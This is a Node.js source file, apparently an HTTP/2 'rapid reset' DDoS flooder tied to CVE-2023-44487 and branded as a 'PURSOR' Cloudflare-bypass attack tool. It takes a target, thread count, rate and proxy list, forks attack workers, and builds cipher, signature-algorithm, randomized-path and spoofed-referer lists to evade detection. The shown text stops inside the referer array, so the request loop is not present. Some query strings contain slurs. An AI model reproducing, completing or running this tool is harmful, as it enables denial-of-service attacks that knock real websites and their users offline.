//HTTP2-RAPID CLIENT CVE-2023-44487

const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 var path = require("path");
 const currentTime = new Date();
 const httpTime = currentTime.toUTCString();

global.l7 = {};
global.storm = {};

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 if (process.argv.length < 8){console.clear();console.log(`[38;2;255;255;255m
[38;2;255;255;255m         *      MMM[38;2;0;221;255m8&&&.      [38;2;255;255;255m      *
[38;2;255;255;255m              MMMM[38;2;0;221;255m88&&&&&   [38;2;255;255;255m .
[38;2;255;255;255m             MMMM[38;2;0;221;255m88&&&&&&&
[38;2;255;255;255m *           MMM[38;2;0;221;255m88&&&&&&&&
[38;2;255;255;255m             MMM[38;2;0;221;255m88&&&&&&&&
[38;2;255;255;255m             'MMM[38;2;0;221;255m88&&&&&&'
[38;2;255;255;255m               'MMM[38;2;0;221;255m8&&&'    [38;2;255;255;255m  *
[38;2;255;255;255m      |___/|
[38;2;255;255;255m      )     (             .              '
[38;2;255;255;255m     =     /=
[38;2;255;255;255m       )===(       *
[38;2;255;255;255m      /     |
[38;2;255;255;255m     /      \
[38;2;255;255;255m\/
[38;2;255;255;255m_/_/_/__  _/_/_/_/_/_/_/_/_/_/_
[38;2;255;255;255m|  |  |  |( (  |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  |  |  |  |  |  |  |  |  |  |  |  |

[38;2;255;255;255m(/) New Project Method [PURSOR] Bypass [HTTP-DDOS] | (Ranz)
[38;2;255;255;255m(/) Contact: @Manusiapendosa1
[38;2;255;255;255m(/) Invalid: (./pursor?)`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }




 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
  
 function randstr(_0xcdc8x17) {
   var _0xcdc8x18 = "";
   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
   var _0xcdc8x1a = _0xcdc8x19.length;
   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {
     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));
   }
   ;
   return _0xcdc8x18;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     threads: ~~process.argv[4],
     Rate: ~~process.argv[5],
     proxyFile: process.argv[6],
     delay: ~~process.argv[7]
}

if (cluster.isMaster){
  for (let i = 0; i < process.argv[4]; i++){
    cluster.fork();
    console.clear();
    console.log(`
[38;2;255;255;255m         *      MMM[38;2;0;221;255m8&&&.      [38;2;255;255;255m      *
[38;2;255;255;255m              MMMM[38;2;0;221;255m88&&&&&   [38;2;255;255;255m .
[38;2;255;255;255m             MMMM[38;2;0;221;255m88&&&&&&&
[38;2;255;255;255m *           MMM[38;2;0;221;255m88&&&&&&&&
[38;2;255;255;255m             MMM[38;2;0;221;255m88&&&&&&&&
[38;2;255;255;255m             'MMM[38;2;0;221;255m88&&&&&&'
[38;2;255;255;255m               'MMM[38;2;0;221;255m8&&&'    [38;2;255;255;255m  *
[38;2;255;255;255m      |___/|
[38;2;255;255;255m      )     (             .              '
[38;2;255;255;255m     =     /=
[38;2;255;255;255m       )===(       *
[38;2;255;255;255m      /     |
[38;2;255;255;255m     /      \
[38;2;255;255;255m\/
[38;2;255;255;255m_/_/_/__  _/_/_/_/_/_/_/_/_/_/_
[38;2;255;255;255m|  |  |  |( (  |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m|  |  |  |  |  |  |  |  |  |  |  |  |  |  |
[38;2;255;255;255m
[38;2;255;255;255m(/) Sytem: Attack started...
[38;2;255;255;255m(/) Target: ${process.argv[2]}
[38;2;255;255;255m(/) Method: PURSOR
[38;2;255;255;255m(/) Time: ${process.argv[3]}
[38;2;255;255;255m(/) Ratelimit: ${process.argv[5]} r/s
[38;2;255;255;255m(/) Threads: ${process.argv[4]}x core
[38;2;255;255;255m(/) Proxyfile: ${process.argv[6]}
[38;2;255;255;255m(/) Delay: ${process.argv[7]} ms
[38;2;255;255;255m(/) Contact: @Manusiapendosa1
    `);
  }
  
  setTimeout(() => {
    console.clear();
    console.log(`Finished`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 

 const cplist = [
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
     'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
     'options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA',
     ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
     'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
];
const hihi = [ "require-corp", "unsafe-none", ];
const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ecdsa_sha1',
    'ed25519',
    'ed448',
    'ecdsa_sha224',
    'rsa_pkcs1_sha1',
    'rsa_pss_pss_sha256',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_pss_sha384',
    'rsa_pkcs1_sha2240',
    'rsa_pss_pss_sha512',
    'sm2sig_sm3',
    'ecdsa_secp521r1_sha512',
];

const pathts = ["?s=", "/?", "", "?q=", "?true=", "?", "/", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04", "?w=", "?e=", "?r=", "?t=", "?y=", "?u=", "?i=", "?o=", "?p=", "?a=", "?s=", "?d=", "?f=", "?g=", "?h=", "?j=", "?k=", "?l=", "?z=", "?x=", "?c=", "?v=", "?b=", "?n=", "?m=", "page=1", "page=2", "page=3", "category=news", "category=sports", "category=technology", "category=entertainment", "sort=newest", "filter=popular", "limit=10", "?ww=", "?ee=", "?rr=", "?tt=", "?yy=", "?uu=", "?ii=", "?oo=", "?pp=", "?aa=", "?ss=", "?dd=", "?ff=", "?gg=", "?hh=", "?jj=", "?kk=", "?ll=", "?zz=", "?xx=", "?cc=", "?vv=", "?bb=", "?n=n", "?mm=", "?wpage=", "?epage=", "?rpage=", "?tpage=", "?ypage=", "?upage=", "?ipage=", "?opage=", "?ppage=", "?apage=", "?spage=", "?dpage=", "?fpage=", "?gpage=", "?hpage=", "?jpage=", "?kpage=", "?lpage=", "?pagez=", "?pagex=", "?cpage=", "?vpage=", "?bpage=", "?pagen=", "?pagem=", "?nndb=", "?beb=", "?xfbeb=", "?neuf=", "?bbfj=", "?dnf e=", "?xjfbe=", "?sidbe=", "?shdbrls=", "?sndbrjwl=", "?bfnedbd=", "?rownsufne=", "?sofbrbucte=", "?brkwoxhrbe=", "?djfbe=", "?sdjdfbekkdhb=", "?dbbeklppskdndb=", "?whbdbdebbsd=", "?dffejsnxfnf=", "?endnnffbwsxixicjbf=", "?bbrhiwndfr=", "?ekiigvrbeod=", "?dirb eoowihxbbe9ubdbd=", "?fi39dbd=", "?3bdocyr=", "?wbdofhevs=", "?ebrcekd=", "?dbrvekdufhebd=", "?tbecsichrv=", "?shdudrvej=", "?hsidjejsdf=", "?hehhehd=", "?e9dkenpems=", "?dhdvwnscfb=", "?ehsvdnrjej=", "?ehebsndnfn=", "?ehdvdbekoieb=", "?vechejnd=", "?brvbnndox=", "?hw920iyt2v=", "?7u2yw77ehv=", "?dbjwo8xbbeb=", "?kibbb=", "?rvwjd=", "?vrpwmbay=", "?v184vd=", "?briefing=", "?vrjejd=", "?rbeodj=", "?fvsj=", "?rjd=", "?brej=", "?udebb=", "?ejehbd=", "?eif63hr=", "?dbw=", "?dbr=", "?wnd=", "?rve=", "?enf=", "?rbe=", "?eof83g3=", "?fbs=", "?f83=", "?dbf=", "?ehdvr=", "?ehdiieve=", "?dhfvjs=", "?jdheuui3eujehr=", "?rnkejd=", "?meknf=", "?xtje=", "?ov4eu=", "?jevd9=", "?p3d8b=", "?search=", "?flood=", "?bypass=", "?google=", "?amp=", "?Clough=", "?cloudflare=", "?le=", "?vy=", "?xx=", "?mix=", "?h2=", "?reset=", "?nigga=", "?didik=", "?meung=", "?mevic=", "?hah=", "?aha=", "?bhd=", "?hish=", "?high=", "?banjir=", "?community=", "?botnet=", "?https=", "?slot=", "?gacor=", "?ngink=", "?apache=", "?api=", "?host=", "?port=", "?time=", "?method=", "?pursor=", "?berak=", "?bibit=", "?baut=", "?campur=", "?selo=", "?peler=", "?meong=", "?project=", "?newflood=", "?stressemevic=", "?joget=", "?privet=", "?private=", "?lol=", "?stfu=", "?lmfao=", "?hehe=", "?try=", "?google=", "?akamai=", "?amazon=", "?dashboard=", "?cloud=", "?stream=", "?collep=", "?mevicbotnet=", "?nenen=",];
const querys = ["", "&", "", "&&", "and", "=", "+", "?",];

const refers = [
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'https://google.com/',
    'https://play.google.com/store/search?q=',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e96a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cfe896a87c19&biw=1680&bih=882&q=',
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
